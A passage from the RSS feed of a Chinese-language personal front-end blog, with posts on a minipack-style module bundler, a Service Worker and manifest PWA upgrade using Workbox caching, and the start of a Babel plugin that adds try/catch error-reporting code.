  &lt;span class=&quot;c1&quot;&gt;//   我们首先创建一个`require()`⏰函数: 它接受一个 `模块ID` 并在我们之前构建的`模块`对象查找它. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   通过解构`const [fn, mapping] = modules[id]`来获得我们的包装函数 和`mappings`对象. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我们模块的代码通过相对路径而不是模块ID调用`require()`. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 但我们的`require`🌟函数接收 `模块ID`. 另外,两个模块可能`require()`相同的相对路径,但意味着两个不同的模块. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//     要处理这个问题,当需要一个模块时,我们创建一个新的,专用的`require`函数供它使用. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 它将是特定的,并将知道通过使用`模块的mapping对象`将 `其相对路径` 转换为`ID`. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 该mapping对象恰好是该特定模块的`相对路径和模块ID`之间的映射. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 最后,使用`commonjs`,当模块需要被导出时,它可以通过改变exports对象来暴露模块的值. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// require函数最后会返回exports对象.&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`
    (function(modules) {
      function require(id) { //🌟
        const [fn, mapping] = modules[id];
        function localRequire(name) { //⏰
          return require(mapping[name]); //🌟
        }
        const module = { exports : {} };
        fn(localRequire, module, module.exports); 
        return module.exports;
      }
      require(0);
    })({&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;})
  `&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我们只需返回结果,欢呼!:)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;graph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;createGraph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./example/entry.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;graph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;建议直接跑minipack的demo。&lt;/p&gt;
</description>
        <pubDate>Tue, 21 Aug 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/08/21/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/08/21/js/</guid>
        
        <category>模块化</category>
        
        
      </item>
    
      <item>
        <title>blog基于Service worker升级的实践</title>
        <description>&lt;p&gt;&lt;strong&gt;PWA&lt;/strong&gt; 全称 &lt;em&gt;Progressive Web Apps&lt;/em&gt;，我理解为给web应用渐进式的升级。&lt;/p&gt;

&lt;p&gt;目前我的blog完成了基于Service worker，Manifest的升级。&lt;/p&gt;

&lt;p&gt;也就是说，我的blog现在是可以安装到桌面的～因为使用了service worker进行了缓存，所以页面渲染速度也减少了一个网络请求的时间。&lt;/p&gt;

&lt;p&gt;如下图，使用cache缓存的情况下，首屏在&lt;strong&gt;10ms&lt;/strong&gt;之前就已经渲染完成了。（当然这也是因为本身blog是静态博客的原因）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/first_page_render.jpeg&quot; height=&quot;400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;缓存以 request / response的形式保存，使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/cache.jpeg&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;service-worker&quot;&gt;Service worker&lt;/h3&gt;

&lt;p&gt;实现这个功能，最重要的则是&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API&quot;&gt;Service worker&lt;/a&gt;。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Service workers 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Service worker功能强大，具有拦截网络请求的功能，配合&lt;strong&gt;cache&lt;/strong&gt; 接口可以做到以 request / respose的形式来缓存静态资源。&lt;/p&gt;

&lt;p&gt;Service worker具有一套完整的生命周期，&lt;code class=&quot;highlighter-rouge&quot;&gt;安装中&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;安装后&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;激活中&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;激活后&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;废弃&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;我们在&lt;code class=&quot;highlighter-rouge&quot;&gt;activate&lt;/code&gt;状态时，可以拦截本地发起的&lt;code class=&quot;highlighter-rouge&quot;&gt;fetch&lt;/code&gt;请求。拦截之后，可以根据各种策略来考虑是否使用缓存，缓存多久过期等等。（这里为了方便，使用了google的workbox，内置了很多好用的缓存策略）&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;importScripts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://storage.googleapis.com/workbox-cdn/releases/3.4.1/workbox-sw.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cacheName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'v4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;workbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strategiesConfig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;workbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;strategies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cacheFirst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cacheName&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;workbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;routing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;registerRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;RegExp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;.css'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;strategiesConfig&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;workbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;routing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;registerRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;RegExp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;strategiesConfig&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;workbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;routing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;registerRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Cache image files&lt;/span&gt;
        &lt;span class=&quot;sr&quot;&gt;/.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.(?:&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;png|jpg|jpeg|svg|gif&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;strategiesConfig&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  	&lt;span class=&quot;c1&quot;&gt;//workbox无法使用情况下的兼容&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'install'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sw installed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cacheName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'./js/blog.min.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'./js/bootstrap.min.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'./js/jquery.min.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'https://retcode.alicdn.com/retcode/bl.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'./css/bootstrap.min.css'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'./css/blog.min.css'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'./css/syntax.css'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'https://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;./img/avatar-jeff.jpeg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;./img/icon_wechat.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;.//img/home-bg.jpg&quot;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fetch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;respondWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cachedRes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cachedRes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'use cached resource:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cachedRes&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
                    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetchRequest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetchRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'activate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sw activate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clients&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;claim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里作为简单的尝试，逻辑还是比较简单的。&lt;/p&gt;

&lt;p&gt;利用Service work还可以做到其他的事情&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;安装service worker时，预缓存&lt;/li&gt;
  &lt;li&gt;离线时，使用service work应用离线缓存（离线页面）&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;sync&lt;/strong&gt; api，离线时存储数据，网络恢复时触发&lt;strong&gt;sync&lt;/strong&gt;事件，可以把网络队列发送出去&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;manifest&quot;&gt;Manifest&lt;/h3&gt;

&lt;p&gt;有开发过 &lt;em&gt;chrome extension&lt;/em&gt; 的同学，应该会对这个很熟悉。&lt;/p&gt;

&lt;p&gt;Manifest其实是一个json格式的文件，里面可以配置webApp的属性/能力，例如&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;作为app展示时的名称 / 描述&lt;/li&gt;
  &lt;li&gt;作为app展示时的icon&lt;/li&gt;
  &lt;li&gt;作为app展示时的形式，可以是浏览器的样式，也可以是没有地址栏（类似app）的样式&lt;/li&gt;
  &lt;li&gt;等等。。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这部分单纯就是页面引用一个json文件而已。是否具有添加到桌面的能力，主要由浏览器来判断，需要满足下面的条件。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;需要两次以上的访问，并且间隔时间大于5分钟&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;

&lt;p&gt;PWA实际上还有其他的一些能力，例如&lt;strong&gt;通知&lt;/strong&gt;机制，appShell等。&lt;/p&gt;

&lt;p&gt;但我理解就是优化了用户体验，使得web应用能力更强大，更像原生的app。&lt;/p&gt;
</description>
        <pubDate>Wed, 15 Aug 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2018/08/15/js/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/08/15/js/</guid>
        
        <category>PWA</category>
        
        
      </item>
    
      <item>
        <title>基于babel在构建阶段添加异常上报代码</title>
        <description>&lt;p&gt;之前在异常上报系统的开发过程中，遇到过try/catch包裹住的代码块中的异步函数异常无法被捕获，&lt;/p&gt;

&lt;p&gt;有有在网上看到一个思路&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;利用构建工具，在代码预处理阶段就用&lt;strong&gt;try/catch&lt;/strong&gt;包裹住源代码的函数体。这样异步函数中的异常也能被捕获。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这种方式主要是避免了手动添加try/catch函数（太过于麻烦），同时也不污染程序猿看的源代码。&lt;/p&gt;

&lt;p&gt;这里先给出实现了该功能的&lt;a href=&quot;https://github.com/JeffAAA/try_catch_wrapper&quot;&gt;babel插件&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;用法&quot;&gt;用法&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm i 	
npm start	
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;源代码&lt;strong&gt;input.js&lt;/strong&gt;中的函数体，将会被加上try/catch的异常上报代码。&lt;/p&gt;

&lt;p&gt;打开根目录下的&lt;strong&gt;output.js&lt;/strong&gt;即可看到转换后的代码。如下&lt;/p&gt;

&lt;p&gt;&lt;em&gt;input.js&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'i an sync function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'i am async function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'i am async function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;转换为&lt;em&gt;output.js&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
